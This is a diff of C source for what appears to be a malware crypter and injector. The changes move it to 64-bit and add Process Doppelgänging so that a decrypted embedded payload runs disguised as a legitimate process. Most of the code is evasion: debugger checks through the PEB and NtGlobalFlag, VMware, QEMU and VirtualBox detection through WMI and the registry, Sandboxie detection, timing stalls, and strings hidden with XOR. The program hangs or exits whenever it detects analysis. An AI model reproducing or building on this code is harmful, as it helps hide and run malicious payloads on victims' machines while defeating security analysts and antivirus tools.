@@ -1,5 +1,7 @@
+// transactional injection MUST BE 64 bit, therefore, we CANNOT use inline assembly. 
 #include <winsock2.h>
 #include <iphlpapi.h>
+#include <KtmW32.h>
 #include <icmpapi.h>
 #include <windows.h>
 #include <stdio.h>
@@ -13,6 +15,422 @@
 #define WIN32_LEAN_AND_MEAN
 #define MAX_KEY_LENGTH 255
 #define MAX_VALUE_NAME 16383
+
+#define STATUS_SUCCESS				((NTSTATUS)0x00000000L) // ntsubauth
+#define NT_SUCCESS(Status) ((NTSTATUS)(Status) == STATUS_SUCCESS)
+#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
+#define PS_INHERIT_HANDLES          4
+#define RTL_USER_PROC_PARAMS_NORMALIZED     0x00000001
+#define RTL_MAX_DRIVE_LETTERS 32
+
+#ifndef KPRIORITY
+typedef LONG KPRIORITY;
+#endif
+void ProcessDoppelgänging(LPWSTR lpTargetApp, LPWSTR lpPayloadApp);
+typedef struct _UNICODE_STRING 
+{
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING;
+typedef UNICODE_STRING *PUNICODE_STRING;
+
+typedef struct _RTL_DRIVE_LETTER_CURDIR {
+	USHORT                  Flags;
+	USHORT                  Length;
+	ULONG                   TimeStamp;
+	UNICODE_STRING          DosPath;
+} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;
+
+typedef struct _PEB_LDR_DATA {
+	ULONG                   Length;
+	BOOLEAN                 Initialized;
+	PVOID                   SsHandle;
+	LIST_ENTRY              InLoadOrderModuleList;
+	LIST_ENTRY              InMemoryOrderModuleList;
+	LIST_ENTRY              InInitializationOrderModuleList;
+} PEB_LDR_DATA, *PPEB_LDR_DATA;
+
+typedef struct _CURDIR
+{
+	UNICODE_STRING DosPath;
+	HANDLE Handle;
+} CURDIR, *PCURDIR;
+
+typedef struct _RTL_USER_PROCESS_PARAMETERS
+{
+	ULONG MaximumLength;
+	ULONG Length;
+
+	ULONG Flags;
+	ULONG DebugFlags;
+
+	HANDLE ConsoleHandle;
+	ULONG ConsoleFlags;
+	HANDLE StandardInput;
+	HANDLE StandardOutput;
+	HANDLE StandardError;
+
+	CURDIR CurrentDirectory;
+	UNICODE_STRING DllPath;
+	UNICODE_STRING ImagePathName;
+	UNICODE_STRING CommandLine;
+	PVOID Environment;
+
+	ULONG StartingX;
+	ULONG StartingY;
+	ULONG CountX;
+	ULONG CountY;
+	ULONG CountCharsX;
+	ULONG CountCharsY;
+	ULONG FillAttribute;
+
+	ULONG WindowFlags;
+	ULONG ShowWindowFlags;
+	UNICODE_STRING WindowTitle;
+	UNICODE_STRING DesktopInfo;
+	UNICODE_STRING ShellInfo;
+	UNICODE_STRING RuntimeData;
+	RTL_DRIVE_LETTER_CURDIR CurrentDirectories[26];
+
+	ULONG EnvironmentSize;
+	ULONG EnvironmentVersion;
+    PVOID PackageDependencyData; //8+
+    ULONG ProcessGroupId;
+   // ULONG LoaderThreads;
+} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
+
+typedef struct _PEB_FREE_BLOCK // 2 elements, 0x8 bytes
+{
+   struct _PEB_FREE_BLOCK * pNext;
+   DWORD dwSize;
+} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;
+
+
+typedef void (*PPEBLOCKROUTINE)(
+								PVOID PebLock
+								);
+
+typedef struct _PEB {
+	BOOLEAN                 InheritedAddressSpace;
+	BOOLEAN                 ReadImageFileExecOptions;
+	BOOLEAN                 BeingDebugged;
+	BOOLEAN                 Spare;
+	HANDLE                  Mutant;
+	PVOID                   ImageBaseAddress;
+	PPEB_LDR_DATA           LoaderData;
+	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
+	PVOID                   SubSystemData;
+	PVOID                   ProcessHeap;
+	PVOID                   FastPebLock;
+	PPEBLOCKROUTINE         FastPebLockRoutine;
+	PPEBLOCKROUTINE         FastPebUnlockRoutine;
+	ULONG                   EnvironmentUpdateCount;
+	PVOID*                  KernelCallbackTable;
+	PVOID                   EventLogSection;
+	PVOID                   EventLog;
+	PPEB_FREE_BLOCK         FreeList;
+	ULONG                   TlsExpansionCounter;
+	PVOID                   TlsBitmap;
+	ULONG                   TlsBitmapBits[0x2];
+	PVOID                   ReadOnlySharedMemoryBase;
+	PVOID                   ReadOnlySharedMemoryHeap;
+	PVOID*                  ReadOnlyStaticServerData;
+	PVOID                   AnsiCodePageData;
+	PVOID                   OemCodePageData;
+	PVOID                   UnicodeCaseTableData;
+	ULONG                   NumberOfProcessors;
+	ULONG                   NtGlobalFlag;
+	BYTE                    Spare2[0x4];
+	LARGE_INTEGER           CriticalSectionTimeout;
+	ULONG                   HeapSegmentReserve;
+	ULONG                   HeapSegmentCommit;
+	ULONG                   HeapDeCommitTotalFreeThreshold;
+	ULONG                   HeapDeCommitFreeBlockThreshold;
+	ULONG                   NumberOfHeaps;
+	ULONG                   MaximumNumberOfHeaps;
+	PVOID*                  *ProcessHeaps;
+	PVOID                   GdiSharedHandleTable;
+	PVOID                   ProcessStarterHelper;
+	PVOID                   GdiDCAttributeList;
+	PVOID                   LoaderLock;
+	ULONG                   OSMajorVersion;
+	ULONG                   OSMinorVersion;
+	ULONG                   OSBuildNumber;
+	ULONG                   OSPlatformId;
+	ULONG                   ImageSubSystem;
+	ULONG                   ImageSubSystemMajorVersion;
+	ULONG                   ImageSubSystemMinorVersion;
+	ULONG                   GdiHandleBuffer[0x22];
+	ULONG                   PostProcessInitRoutine;
+	ULONG                   TlsExpansionBitmap;
+	BYTE                    TlsExpansionBitmapBits[0x80];
+	ULONG                   SessionId;
+} PEB, *PPEB;
+
+typedef struct _PROCESS_BASIC_INFORMATION {
+    PVOID Reserved1;
+    PPEB PebBaseAddress;
+    PVOID Reserved2[2];
+    ULONG_PTR UniqueProcessId;
+    PVOID Reserved3;
+} PROCESS_BASIC_INFORMATION;
+
+/*
+typedef struct _PROCESS_BASIC_INFORMATION {
+	NTSTATUS ExitStatus;
+	PVOID PebBaseAddress;
+	ULONG_PTR AffinityMask;
+	KPRIORITY BasePriority;
+	ULONG_PTR UniqueProcessId;
+	ULONG_PTR InheritedFromUniqueProcessId;
+} PROCESS_BASIC_INFORMATION;
+typedef PROCESS_BASIC_INFORMATION *PPROCESS_BASIC_INFORMATION;
+*/
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
+    PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE
+} OBJECT_ATTRIBUTES;
+typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;
+
+#define InitializeObjectAttributes( p, n, a, r, s ) { \
+    (p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
+    (p)->RootDirectory = r;                           \
+    (p)->Attributes = a;                              \
+    (p)->ObjectName = n;                              \
+    (p)->SecurityDescriptor = s;                      \
+    (p)->SecurityQualityOfService = NULL;             \
+    }
+
+typedef enum _PROCESSINFOCLASS {
+	ProcessBasicInformation = 0,
+	ProcessQuotaLimits = 1,
+	ProcessIoCounters = 2,
+	ProcessVmCounters = 3,
+	ProcessTimes = 4,
+	ProcessBasePriority = 5,
+	ProcessRaisePriority = 6,
+	ProcessDebugPort = 7,
+	ProcessExceptionPort = 8,
+	ProcessAccessToken = 9,
+	ProcessLdtInformation = 10,
+	ProcessLdtSize = 11,
+	ProcessDefaultHardErrorMode = 12,
+	ProcessIoPortHandlers = 13,
+	ProcessPooledUsageAndLimits = 14,
+	ProcessWorkingSetWatch = 15,
+	ProcessUserModeIOPL = 16,
+	ProcessEnableAlignmentFaultFixup = 17,
+	ProcessPriorityClass = 18,
+	ProcessWx86Information = 19,
+	ProcessHandleCount = 20,
+	ProcessAffinityMask = 21,
+	ProcessPriorityBoost = 22,
+	ProcessDeviceMap = 23,
+	ProcessSessionInformation = 24,
+	ProcessForegroundInformation = 25,
+	ProcessWow64Information = 26,
+	ProcessImageFileName = 27,
+	ProcessLUIDDeviceMapsEnabled = 28,
+	ProcessBreakOnTermination = 29,
+	ProcessDebugObjectHandle = 30,
+	ProcessDebugFlags = 31,
+	ProcessHandleTracing = 32,
+	ProcessIoPriority = 33,
+	ProcessExecuteFlags = 34,
+	ProcessTlsInformation = 35,
+	ProcessCookie = 36,
+	ProcessImageInformation = 37,
+	ProcessCycleTime = 38,
+	ProcessPagePriority = 39,
+	ProcessInstrumentationCallback = 40,
+	ProcessThreadStackAllocation = 41,
+	ProcessWorkingSetWatchEx = 42,
+	ProcessImageFileNameWin32 = 43,
+	ProcessImageFileMapping = 44,
+	ProcessAffinityUpdateMode = 45,
+	ProcessMemoryAllocationMode = 46,
+	ProcessGroupInformation = 47,
+	ProcessTokenVirtualizationEnabled = 48,
+	ProcessOwnerInformation = 49,
+	ProcessWindowInformation = 50,
+	ProcessHandleInformation = 51,
+	ProcessMitigationPolicy = 52,
+	ProcessDynamicFunctionTableInformation = 53,
+	ProcessHandleCheckingMode = 54,
+	ProcessKeepAliveCount = 55,
+	ProcessRevokeFileHandles = 56,
+	ProcessWorkingSetControl = 57,
+	ProcessHandleTable = 58,
+	ProcessCheckStackExtentsMode = 59,
+	ProcessCommandLineInformation = 60,
+	ProcessProtectionInformation = 61,
+	MaxProcessInfoClass = 62
+} PROCESSINFOCLASS;
+
+
+
+typedef NTSTATUS NTAPI NTCREATETRANSACTION(
+	     PHANDLE TransactionHandle,
+	      ACCESS_MASK DesiredAccess,
+	  POBJECT_ATTRIBUTES ObjectAttributes,
+	  LPGUID Uow,
+	  HANDLE TmHandle,
+	  ULONG CreateOptions,
+	  ULONG IsolationLevel,
+	  ULONG IsolationFlags,
+	  PLARGE_INTEGER Timeout,
+	  PUNICODE_STRING Description
+	);
+typedef NTCREATETRANSACTION FAR * LPNTCREATETRANSACTION;
+
+typedef NTSTATUS NTAPI NTALLOCATEVIRTUALMEMORY(
+	        HANDLE ProcessHandle,
+	     PVOID *BaseAddress,
+	        ULONG_PTR ZeroBits,
+	     PSIZE_T RegionSize,
+	        ULONG AllocationType,
+	        ULONG Protect
+	);
+typedef NTALLOCATEVIRTUALMEMORY FAR * LPNTALLOCATEVIRTUALMEMORY;
+
+typedef NTSTATUS NTAPI NTCREATESECTION(
+			PHANDLE SectionHandle,
+			ACCESS_MASK DesiredAccess,
+		POBJECT_ATTRIBUTES ObjectAttributes,
+		PLARGE_INTEGER MaximumSize,
+			ULONG SectionPageProtection,
+			ULONG AllocationAttributes,
+		HANDLE FileHandle
+	);
+typedef NTCREATESECTION FAR * LPNTCREATESECTION;
+
+typedef NTSTATUS NTAPI NTROLLBACKTRANSACTION(
+     HANDLE  TransactionHandle,
+     BOOLEAN Wait);
+typedef NTROLLBACKTRANSACTION FAR * LPNTROLLBACKTRANSACTION;
+
+typedef NTSTATUS NTAPI NTCLOSE(
+	 HANDLE Handle
+	);
+typedef NTCLOSE FAR * LPNTCLOSE;
+
+typedef NTSTATUS NTAPI NTCREATEPROCESSEX(
+        PHANDLE ProcessHandle,
+         ACCESS_MASK DesiredAccess,
+     POBJECT_ATTRIBUTES ObjectAttributes,
+         HANDLE ParentProcess,
+         ULONG Flags,
+     HANDLE SectionHandle,
+     HANDLE DebugPort,
+     HANDLE ExceptionPort,
+         BOOLEAN InJob);
+typedef NTCREATEPROCESSEX FAR * LPNTCREATEPROCESSEX;
+
+typedef NTSTATUS NTAPI NTQUERYINFORMATIONPROCESS(
+			HANDLE ProcessHandle,
+			PROCESSINFOCLASS ProcessInformationClass,
+			PVOID ProcessInformation,
+			ULONG ProcessInformationLength,
+		PULONG ReturnLength
+	);
+typedef NTQUERYINFORMATIONPROCESS FAR * LPNTQUERYINFORMATIONPROCESS;
+
+typedef NTSTATUS NTAPI NTREADVIRTUALMEMORY(
+			HANDLE ProcessHandle,
+		PVOID BaseAddress,
+			PVOID Buffer,
+			SIZE_T BufferSize,
+		PSIZE_T NumberOfBytesRead
+	);
+typedef NTREADVIRTUALMEMORY FAR * LPNTREADVIRTUALMEMORY;
+
+typedef NTSTATUS NTAPI NTWRITEVIRTUALMEMORY(
+	        HANDLE ProcessHandle,
+	    PVOID BaseAddress,
+	        VOID *Buffer,
+	        SIZE_T BufferSize,
+	   PSIZE_T NumberOfBytesWritten
+	);
+typedef NTWRITEVIRTUALMEMORY FAR * LPNTWRITEVIRTUALMEMORY;
+
+typedef NTSTATUS NTAPI NTCREATETHREADEX(
+     PHANDLE hThread,
+      ACCESS_MASK DesiredAccess,
+      LPVOID ObjectAttributes,
+      HANDLE ProcessHandle,
+      LPTHREAD_START_ROUTINE lpStartAddress,
+      LPVOID lpParameter,
+      BOOL CreateSuspended,
+      DWORD StackZeroBits,
+      DWORD SizeOfStackCommit,
+      DWORD SizeOfStackReserve,
+     LPVOID lpBytesBuffer);
+typedef NTCREATETHREADEX FAR * LPNTCREATETHREADEX;
+
+typedef NTSTATUS NTAPI NTFREEVIRTUALMEMORY(
+	       HANDLE ProcessHandle,
+	    PVOID *BaseAddress,
+	    PSIZE_T RegionSize,
+	       ULONG FreeType
+	);
+typedef NTFREEVIRTUALMEMORY FAR * LPNTFREEVIRTUALMEMORY;
+
+LPNTCREATETRANSACTION		NtCreateTransaction;
+LPNTALLOCATEVIRTUALMEMORY	NtAllocateVirtualMemory;
+LPNTCREATESECTION			NtCreateSection;
+LPNTROLLBACKTRANSACTION		NtRollbackTransaction;
+LPNTCLOSE					NtClose;
+LPNTCREATEPROCESSEX			NtCreateProcessEx;
+LPNTQUERYINFORMATIONPROCESS	NtQueryInformationProcess;
+LPNTREADVIRTUALMEMORY		NtReadVirtualMemory;
+LPNTWRITEVIRTUALMEMORY		NtWriteVirtualMemory;
+LPNTCREATETHREADEX			NtCreateThreadEx;
+LPNTFREEVIRTUALMEMORY		NtFreeVirtualMemory;
+
+
+typedef NTSTATUS NTAPI RTLCREATEPROCESSPARAMETERSEX(
+     PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
+     PUNICODE_STRING ImagePathName,
+     PUNICODE_STRING DllPath,
+     PUNICODE_STRING CurrentDirectory,
+     PUNICODE_STRING CommandLine,
+     PVOID Environment,
+     PUNICODE_STRING WindowTitle,
+     PUNICODE_STRING DesktopInfo,
+     PUNICODE_STRING ShellInfo,
+     PUNICODE_STRING RuntimeData,
+     ULONG Flags);
+typedef RTLCREATEPROCESSPARAMETERSEX FAR * LPRTLCREATEPROCESSPARAMETERSEX;
+
+typedef NTSTATUS NTAPI RTLDESTROYPROCESSPARAMETERS(
+     PRTL_USER_PROCESS_PARAMETERS ProcessParameters
+    );
+typedef RTLDESTROYPROCESSPARAMETERS FAR * LPRTLDESTROYPROCESSPARAMETERS;
+
+LPRTLCREATEPROCESSPARAMETERSEX		RtlCreateProcessParametersEx;
+LPRTLDESTROYPROCESSPARAMETERS		RtlDestroyProcessParameters;
+
+
+typedef PIMAGE_NT_HEADERS NTAPI RTLIMAGENTHEADER(
+	 PVOID Base
+	);
+typedef RTLIMAGENTHEADER FAR * LPRTLIMAGENTHEADER;
+LPRTLIMAGENTHEADER			RtlImageNtHeader;
+
+
+typedef PVOID NTAPI RTLINITUNICODESTRING(
+		PUNICODE_STRING DestinationString,
+     PCWSTR SourceString
+	);
+typedef RTLINITUNICODESTRING FAR * LPRTLINITUNICODESTRING;
+LPRTLINITUNICODESTRING			RtlInitUnicodeString;
+
+
 
 // function prototypes
 //replaceatbeginning0
@@ -28,7 +446,7 @@
 byte *GetPayload(void);
 //byte *decrypted(byte *data, int length, int crytptkey); // moved to joecrypt_injecter.h
 //WCHAR *widedecrypt(byte *data, int length, int crytptkey); // moved to joecrypt_injecter.h
-void LongStall(void);
+extern unsigned int __cdecl longStall_ASM(void);
 int procmem_evas(void);
 int NumaEvas(void);
 int AllocMem_Fornoreason(void);
@@ -41,11 +459,11 @@ int timing_evasion_3(void);
 int timing_evasion_4(void);
 int timing_evasion_5(void);
 int timing_evasion_6(void);
-char GetBeingDebugged(void);
-BOOL IsInsideVMWare(void);
-char GetNtGlobalFlags(void);
+extern void __cdecl GetBeingDebugged_ASM(void);
+extern void __cdecl IsInsideVMWare_ASM(void);
+extern void __cdecl GetNtGlobalFlags_ASM(void);
 void checkQIP(void);
-void GetHeapFlags(void);
+extern void __cdecl GetHeapFlags_ASM(void);
 void anti_vm_wmi_1(void);
 void anti_vm_wmi_2(void);
 void anti_vm_wmi_3(void);
@@ -57,8 +475,8 @@ int reg_enum_vm_check(void);
 int AntiEmu(void);
 void JoeSpecial(void);
 void special_usercheck(void);
-void AnotherAntiDebugRoutine(void);
-void GS_Check(void);
+// void AnotherAntiDebugRoutine(void); doesnt work 64 bit AT ALL
+extern void __cdecl GS_Check_ASM(void);
 void AntiProcMon(void);
 void date_specific_check(char *shortdate);
 void region_specific_check(char *region);
@@ -77,7 +495,9 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
 			byte *payload = decrypted(GetPayload(),rsrc_len, cryptokey);
 			// writefile to %%temp% and run with createprocess or shellexec or something
-			ExecFile(decrypted("f?YYrlkajrvYYv|vq`h67YYkjq`uda+`}`",34,5),payload); // xor'd by 5 from c:\\windows\\system32\\notepad.exe	
+			//ExecFile(decrypted("f?YYrlkajrvYYv|vq`h67YYkjq`uda+`}`",34,5),payload); // xor'd by 5 from c:\\windows\\system32\\notepad.exe	
+			ProcessDoppelgänging(L"nslookup32.exe", L"countcores64.exe");
+			// have to write file before we dopplegang it 
 			
 			
 		}
@@ -98,13 +518,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     LPSTR lpCmdLine, int nCmdShow)
 {
 	checkQIP();
-	if(GetNtGlobalFlags() == 'p')
-	{
-	   __asm{
- db 0xEB 
- db 0xFE 
- }
-	}
+	GetNtGlobalFlags_ASM();
     WNDCLASSEX wc;
     HWND hwnd;
     MSG Msg;
@@ -126,15 +540,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	sprintf(mystr,"%x",kek);
 	// random window name
 	int kk = rand() % (256 - 64 + 1) + 64;
-	__asm
-	{
-		xor ecx,ecx
-		mov ecx,kk
-		next:
-		fnop
-		nop
-		loop next
-	}
+	Sleep(kk);
 	// random stall for to ensure window name and title are different 
 	DWORD rekt = GetTickCount();
 	sprintf(name2,"%x",rekt);
@@ -200,24 +606,7 @@ byte *GetPayload(void)
 
 
 
-void LongStall(void)
-{
-	DWORD ayylmao=timeGetTime() * 21;
-	_asm
-	{
-	xor eax,eax
-	xor ecx,ecx
-	mov eax,ayylmao
-	mov ecx,0
-	testd:
-	fnop
-	inc ecx
-	cmp eax,ecx
-	jnz testd
-	pop ebx
-	nop
-	}
-}
+
 
 
 typedef volatile struct _PROCESS_MEMORY_COUNTERS {
@@ -254,11 +643,8 @@ GetProcMem(GetCurrentProcess(), &pmc, sizeof(pmc));
   {
   // debugger / AV detected
 		
-	__asm 
-	{
-	 push 0
-	 call ExitProcess
-	}
+	ExitProcess(0);
+	
   }
 return 0;
 }
@@ -285,11 +671,7 @@ int NumaEvas(void) // doesnt work on xp
 	 else
 	 {
 		// exit process
-	 	__asm
-		{
-			push 0
-			call ExitProcess
-		}
+	 	ExitProcess(0);
 		return 0;
 	 }
 	}
@@ -400,10 +782,7 @@ int FlsTrick(void)
 		}
 		else
 		{
-			__asm{
-				push 0
-				call ExitProcess
-				}
+			ExitProcess(1);
 			return 0;
 		}
 	}
@@ -414,95 +793,13 @@ int FlsTrick(void)
 	}
 }
 
-char GetBeingDebugged(void)
-{
-	char BeingDebuggedBit;
-	__asm {
-		MOV EAX,DWORD PTR FS:[0x30]
-		XOR EAX, 0x2
-		SUB EBX, EBX
-		XOR BL, [EAX]
-		MOV BeingDebuggedBit, BL
-	};
-	return( BeingDebuggedBit );
-}
 
-BOOL IsInsideVMWare(void)
-{
-  BOOL rc = 0;
 
-  __try
-  {
-    __asm
-    {
-      push   edx
-      push   ecx
-      push   ebx
 
-      mov    eax, 0x564D5868
-      mov    ebx, 0 // any value but not the MAGIC VALUE
-      mov    ecx, 10 // get VMWare version
-      mov    edx, 0x5658 //'VX' // port number
 
-      in     eax, dx // read port
-                     // on return EAX returns the VERSION
-      cmp    ebx, 0x564D5868 //"VMXh" // is it a reply from VMWare?
-      jnz lolol
-      mov rc,0 // lol redundancy
-      pop    ebx
-      pop    ecx
-      pop    edx
-      ret  
-	  lolol:	  
-	  mov rc,1
-      pop    ebx
-      pop    ecx
-      pop    edx
-      ret
-// setz   rc fails
 
-    }
-  }
-  __except(EXCEPTION_EXECUTE_HANDLER)
-  {
-    rc = 0;
-  }
 
-  return rc;
-}
 
-char GetNtGlobalFlags(void)
-{
-	char *NtGlobalFlags;
-	__asm {
-		MOV EAX, FS:[0x30] 
-		MOV EAX, [EAX+0x68]
-		MOV [NtGlobalFlags], EAX
-	};
-	return( ( char ) NtGlobalFlags );
-} // check for 0x70 
-
-void GetHeapFlags(void)
-{
-	char *HeapFlags;
-	__asm {
-		MOV EAX, FS:[0x30]
-		MOV EAX, [EAX+0x18]
-		MOV EAX, [EAX+0x10]
-		MOV [HeapFlags], EAX
-	};
-	if((char)HeapFlags !=0)
-	{
-		return;
-	}
-	else
-	{
-		__asm{
- db 0xEB 
- db 0xFE 
- }
-	}
-} // make sure result != 0
 
 
 typedef NTSTATUS ( WINAPI *NQIP )( HANDLE, LONG, PVOID, ULONG, PULONG );
@@ -517,11 +814,7 @@ void checkQIP(void)
 	NtQueryInformationProcess( GetCurrentProcess( ), 0x7, &returnValue, 4, 0 );
 	if( returnValue != 0 )
 	{
-		__asm
-		{
-			push 0
-			call ExitProcess
-		}
+		ExitProcess(0);
 	}
 }
 
@@ -557,26 +850,17 @@ void anti_vm_wmi_1(void)
 
 			if(strstr(prop,vm1))
 			{
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 			}
 
 			if(strstr(prop,vm2))
 			{
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 			}
 
 			if(strstr(prop,vm3))
 			{
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 			}
             result->lpVtbl->Release(result);
         }
@@ -626,26 +910,17 @@ void anti_vm_wmi_2(void)
 
 			if(strstr(prop,vm1))
 			{
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 			}
 
 			if(strstr(prop,vm2))
 			{
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 			}
 
 			if(strstr(prop,vm3))
 			{
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 			}
             result->lpVtbl->Release(result);
         }
@@ -691,26 +966,17 @@ void anti_vm_wmi_3(void)
 			
 			if(strstr(prop,vm1))
 			{
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 			}
 
 			if(strstr(prop,vm2))
 			{
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 			}
 
 			if(strstr(prop,vm3))
 			{
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 			}
             result->lpVtbl->Release(result);
         }
@@ -757,26 +1023,17 @@ void anti_vm_wmi_4(void)
 			
 			if(strstr(prop,vm1))
 			{
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 			}
 
 			if(strstr(prop,vm2))
 			{
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 			}
 
 			if(strstr(prop,vm3))
 			{
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 			}
             result->lpVtbl->Release(result);
         }
@@ -816,10 +1073,7 @@ void anti_vm_wmi_5(void)
     	}
 		if(GetLastError() == 14007)
 		{
-		__asm{
- db 0xEB 
- db 0xFE 
- }
+jumptoself_ASM();
 		}
     results->lpVtbl->Release(results);
     services->lpVtbl->Release(services);
@@ -854,10 +1108,7 @@ void anti_vm_wmi_6(void)
 		}
 		if(GetLastError() == 14007)
 		{
-		__asm{
- db 0xEB 
- db 0xFE 
- }
+jumptoself_ASM();
 		}
     }
     results->lpVtbl->Release(results);
@@ -895,10 +1146,7 @@ void anti_vm_wmi_7(void)
 			if(SysStringByteLen(caption.bstrVal) == 0)
 			{
 			//no data? must be a vm!
-			__asm{
- db 0xEB 
- db 0xFE 
- }
+	jumptoself_ASM();
 			}
 			result->lpVtbl->Release(result);
         }
@@ -949,25 +1197,16 @@ int reg_enum_vm_check(void)
             {
                 if(strstr(achKey,decrypted("^Eizm",6,8))) // VMware
 				{
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 				}
 				if(strstr(achKey,decrypted("T@HP",4,5))) // QEMU
 				{
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 				}
 				if(strstr(achKey,decrypted("|her",4,10))) // vbox
 				{
 				
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 				}
 				
             }
@@ -1006,25 +1245,16 @@ int reg_enum_vm_check(void)
             {
                 if(strstr(achKey,decrypted("^Eizm",6,8))) // VMware
 				{
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 				}
 				if(strstr(achKey,decrypted("T@HP",4,5))) // QEMU
 				{
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 				}
 				if(strstr(achKey,decrypted("|her",4,10))) // vbox
 				{
 				
-				__asm{
- db 0xEB 
- db 0xFE 
- }
+		jumptoself_ASM();
 				}
 				
             }
@@ -1043,20 +1273,14 @@ int AntiEmu(void)
 {
 	if(GetModuleHandle(decrypted("RchdEmm/emm",11,1)) !=0) // SbieDll.dll
 	{
-	__asm{
- db 0xEB 
- db 0xFE 
- }
+jumptoself_ASM();
 	}
 	DWORD ticks = GetTickCount();
 	Sleep(702);
 	DWORD ticks_test = GetTickCount();
 	if((ticks_test - ticks) < 700)
 	{
-	__asm{
- db 0xEB 
- db 0xFE 
- }
+jumptoself_ASM();
 	}
 	return 0;
 }
@@ -1068,10 +1292,7 @@ void special_usercheck(void)
 	GetUserName(user,&len);
 	if(strstr(user,"Johnson"))
 	{
-			__asm{
- db 0xEB 
- db 0xFE 
- }
+	jumptoself_ASM();
 	}
 }
 
@@ -1120,12 +1341,10 @@ void MemSizeTrick(void)
 	
 	if(biggun <= 2048)
 	{
-		__asm{
- db 0xEB 
- db 0xFE 
- }
+jumptoself_ASM();
 	}
 }
+/*
 void AnotherAntiDebugRoutine(void)
 {
 	_asm
@@ -1169,32 +1388,8 @@ void AnotherAntiDebugRoutine(void)
 	blocEnd:
 	}
 }
+*/
 
-void GS_Check(void)
-{
-	_asm
-	{
-	push 3
-	pop gs
-	l1: mov ax, gs
-	cmp  al, 3
-	je l1
-	push 3
-	pop gs
-	mov ax, gs
-	cmp al, 3
-	jne being_debugged
-	pop ecx
-	xor eax,eax
-	mov esp,ebp
-	pop ebp
-	retn
-	being_debugged:
-	mov eax,0xdeadbeef
-	jmp eax
-	}
-return;
-}
 
 void AntiProcMon(void) // EXPIMENTAL. Detects if procmon has ever been run
 {
@@ -1207,10 +1402,7 @@ void AntiProcMon(void) // EXPIMENTAL. Detects if procmon has ever been run
 	}
 	else
 	{
-		__asm{
- db 0xEB 
- db 0xFE 
- }
+jumptoself_ASM();
 	}
 	
 return;
@@ -1233,10 +1425,7 @@ void date_specific_check(char *shortdate)
 		return;
 	}
 	else{
-	__asm{
- db 0xEB 
- db 0xFE 
- }
+jumptoself_ASM();
 	}
 }
 
@@ -1400,10 +1589,7 @@ char *lang = "";
 		}
 		else
 		{
-			__asm{
- db 0xEB 
- db 0xFE 
- }
+	jumptoself_ASM();
 		}
 	return;
 }
@@ -1441,11 +1627,7 @@ int timing_evasion_1(void)
 	}
 	else
 	{
-		__asm
-		{
-			push 0
-			call ExitProcess
-		}
+		ExitProcess(1);
 		return 0;
 	}
 }
@@ -1454,9 +1636,6 @@ int timing_evasion_2(void)
 {	
 I_RpcPauseExecution(600000); // ten mins
 int x = 0;
-__asm{
-mov x,edx
-}
 return x;
 }
 
@@ -1471,10 +1650,8 @@ int timing_evasion_3(void)
 	FARPROC mydelay = GetProcAddress(hDLL_,decrypted(funcname,16,4));
 	mydelay(FALSE,&y);
 	}
-int x = 0;
-__asm{
-mov x,ecx
-}
+int x = 1;
+
 return x;
 }
 
@@ -1492,9 +1669,7 @@ int timing_evasion_4(void)
     ReplyBuffer = (VOID*) malloc(ReplySize);
     IcmpSendEcho(hIcmpFile, destip, SendData, sizeof(SendData), NULL, ReplyBuffer, ReplySize, 600000);
 	int x = 0;
-	__asm{
-	mov x,ebx
-		}
+
 	return x;
 }
 int timing_evasion_5(void)
@@ -1511,9 +1686,7 @@ int timing_evasion_5(void)
     ReplyBuffer = (VOID*) malloc(ReplySize);
     IcmpSendEcho2(hIcmpFile, NULL, NULL, NULL, destip, SendData, sizeof(SendData), NULL, ReplyBuffer, ReplySize, 600000);
 	int x = 0;
-	__asm{
-	mov x,eax
-		}
+
 	return x;
 }
 int timing_evasion_6(void)
@@ -1540,9 +1713,7 @@ int timing_evasion_6(void)
     ReplyBuffer = (VOID*) malloc(ReplySize);
    	IcmpSendEcho2Ex(hIcmpFile,NULL,NULL,NULL,sourceip,destip,SendData,sizeof(SendData),NULL,ReplyBuffer,ReplySize,600000); // 10 mins
